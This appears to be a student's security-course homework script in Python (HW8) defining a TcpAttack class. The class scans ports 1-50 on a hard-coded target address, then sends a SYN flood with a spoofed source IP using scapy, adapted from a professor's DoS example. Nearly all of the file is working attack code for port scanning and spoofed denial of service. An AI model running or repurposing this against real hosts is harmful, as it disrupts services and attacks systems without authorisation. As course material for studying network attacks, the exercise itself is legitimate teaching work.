#!/usr/bin/env python3
#HW8
#Dhruv Aggarwal
#aggarw45
#3/25/20

import sys, socket 
import re
import os.path
from scapy.all import *

class TcpAttack:
    def __init__(self,spoofIP,targetIP):
        self.spoof = spoofIP
        self.target = targetIP

    def scanTarget(self,rangeStart,rangeEnd):
        file_output = open("openports.txt","w")
        #code from page 91 in lecture 16 from professor's notes
        for testport in range(rangeStart,rangeEnd+1):
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
            sock.settimeout(0.1)
            try:
                sock.connect( (self.target, testport) )
                tp_print = str(testport) 
                file_output.write(tp_print + '\n')
            except:
                pass

    def attackTarget(self,port,numSyn):
        sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
        testport = 0
        try:
            sock.connect( (self.target, port) )
            testport = 1
        except:
            pass
        #code from professor's downloadable code D0S5.py        
        if testport == 1:    
            for i in range(numSyn):
                IP_header = IP(src = self.spoof, dst = self.target) 
                TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
                packet = IP_header / TCP_header
                try:                                             
                    send(packet)
                except:
                    pass
            return 1
        else:
            return 0

if __name__ == "__main__":
    spoof = '192.168.0.25'
    target = '128.46.4.88'
    start = 1
    end = 50
    port = 80

    tcp = TcpAttack(spoof,target)
    tcp.scanTarget(start,end)
    if (tcp.attackTarget(port, 10)):
        print ('port was able to be attacked')
    else:
        print ('port not able to be attacked')